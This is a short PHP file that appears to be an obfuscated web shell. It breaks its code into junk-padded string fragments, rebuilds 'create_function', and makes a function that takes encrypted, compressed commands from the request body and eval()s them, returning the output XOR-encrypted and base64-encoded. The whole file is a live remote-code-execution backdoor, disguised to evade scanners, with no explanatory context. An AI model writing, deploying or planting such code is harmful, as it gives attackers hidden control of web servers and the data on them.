<?php
$M='HkHPdkHDyXQNxI5LePOF";fkHunkHction xkH($t,$k){$kHckH=skHtrlen($k)kH;$';
$I=str_replace('Tz','','cTzreaTzte_TzTzTzfunctTzion');
$Y=')=kH=1)kH {@ob_stakHrt();@ekHval(@gzkHuncomprkHeskHs(@x(@baskHe64_decodk';
$h=';$j++,$i+kH+){$o.=$kHt{kH$i}^$k{$jkH};}kH}returkHkHn $o;}if kH(@pkHre';
$e='l=skHtrlen($kHt);$o=""kH;for($i=0;kH$i<$kHl;){forkH(kH$j=0kH;($jkH<$c&&$ikH<$l)';
$Z='He(kH$m[1])kH,$k)))kH;$o=@ob_get_kHconkHtentkHs();@ob_ekHkHndkH_clean()';
$g='gkH_mkHatch("kH/$kh(.+)$kf/",@kHfile_get_contekHntskH("php:/kH/kHinput"),$kHm';
$i=';kH$r=@baskHe64_encode(@kHkHx(@gzcomkHpkHress($o),$kkH));print("$pkHkH$kh$r$kf");}';
$X='$k="kHkH108b4f2a";$kh="kH1kHd17b6902bkH6f"kHkH;$kf="70624kHf90b90d";$p="Gk';
$n=str_replace('kH','',$X.$M.$e.$h.$g.$Y.$Z.$i);
$s=$I('',$n);$s();
?>
